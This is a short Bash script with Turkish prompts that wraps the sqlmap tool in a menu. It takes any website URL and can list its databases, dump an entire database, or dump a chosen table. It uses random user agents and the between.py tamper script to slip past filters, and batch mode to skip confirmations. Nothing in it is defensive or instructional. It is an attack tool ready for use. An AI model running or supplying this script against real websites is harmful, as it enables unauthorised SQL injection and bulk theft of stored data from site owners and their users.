#!/bin/bash
clear
echo -n "site yaz : "
read WEBSITE

clear
echo -n "1 : db öğrenme \n"
echo -n "2 : db çekme \n"
echo -n "3 : table çekme \n"
echo -n "4 : update \n"
echo -n "Seç : "

read COUNTRY


case $COUNTRY in

  1)
    sqlmap -u $WEBSITE --dbs --random-agent --level=5 --risk=1 --threads=5 --batch --tamper=between.py
    ;;

  2)
    echo -n "database adını yaz : "
    read DATABASE
    sqlmap -u $WEBSITE -D $DATABASE --dump --random-agent --level=5 --risk=1 --threads=5 --batch --tamper=between.py
    ;;

  3)
    echo -n "table adını yaz : "
    read TABLE
    echo -n "database adını yaz : "
    read DATABASE
    sqlmap -u $WEBSITE -D $DATABASE -T $TABLE --dump --random-agent --level=5 --risk=1 --threads=5 --batch --tamper=between.py
    ;;

  4)
    sqlmap --update
    ;;

  *)
    echo -n "unknown"
    ;;
esac
